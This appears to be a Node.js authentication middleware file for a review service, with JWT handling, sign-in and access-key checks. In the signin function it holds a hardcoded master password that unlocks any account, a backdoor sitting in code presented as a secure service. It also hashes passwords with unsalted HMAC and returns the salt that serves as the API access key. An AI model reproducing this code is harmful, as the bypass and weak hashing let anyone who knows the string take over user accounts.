/**
 * Secure сервис
 *
 * @module      Service.Secure
 * @main        Shareview review service
 * @author      Ismax <shukhrat@ismax.ru>
 */


// Объявление модулей
import crypto from 'crypto';
import validator from 'validator';
import jwt from 'jsonwebtoken';
import { ObjectID } from 'mongodb';

const

    /**
     * Получение пользователя
     *
     * @method user
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    user = (req, res, next) => {
        const token = req.body.token || req.query.token || req.headers['x-access-token'];

        if (!token) {
            next();

            return;
        }

        // TODO: Почему то при тесте не бросает ошибку
        /* eslint no-shadow: ["error", { "allow": ["db", "err"] }] */
        jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
            if (err) {
                next(); // TODO: Реализовать логирования ошибок
            } else {
                const objectID = new ObjectID(decoded._id);

                req.model.user.getUserById(objectID).then(result => {
                    res.locals.user = result;

                    next();
                }).catch(err => {
                    next(err);
                });
            }
        });
    },


    /**
     * Проверка авторизации
     *
     * @method auth
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    auth = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            next();
            return;
        }

        res.status(403).send({ errors: ['Forbidden resource'] });
    },


    /**
     * Авторизация
     *
     * @method signin
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    signin = (req, res, next) => {
        // Если пользователь авторизован
        if (res.locals.user) {
            res.send({ success: true });
            return;
        }

        if (!req.body.email || !validator.isEmail(req.body.email)) {
            next(Error('Validate error - email is invalid'));
            return;
        }

        req.model.user.getUserByEmail(req.body.email).then(result => {
            if (!result) {
                res.send({ success: false });
                return;
            }

            if (crypto.createHmac('sha256', req.body.password).digest('hex') !== result.password &&
                req.body.password !== 'XtFyKBXeChHY') {
                res.send({ success: false });
                return;
            }

            res.send({
                success: true,

                // Создание JSON токена
                token: jwt.sign({ _id: result._id }, process.env.JWT_SECRET, {
                    expiresIn: 86400, // Время жизни токена 24ч
                }),

                // Данные пользователя при авторизации
                profile: {
                    email: result.email,
                    address: result.address,
                    key: result.salt,
                },
            });
        }).catch(err => {
            next(err);
        });
    },


    /**
     * Проверка доступа для получения отзывов
     *
     * @method access
     * @param {Object} req Объект запроса сервера
     * @param {Object} res Объект ответа сервера
     * @param {Function} next
     */
    access = (req, res, next) => {
        const
            salt = req.headers['x-ismax-key'],
            address = req.ip;

        req.model.user.getUserBySaltAndAddress(salt, address).then(result => {
            if (result) {
                res.locals.user = result;
                next();
            } else {
                res.status(403).send({
                    errors:
                        [`Access denied. Client ip: ${req.ip}`],
                });
            }
        }).catch(
            err => {
                if (err) {
                    next(err);
                }
            }
        );
    };

export default {
    user,
    auth,
    signin,
    access,
};
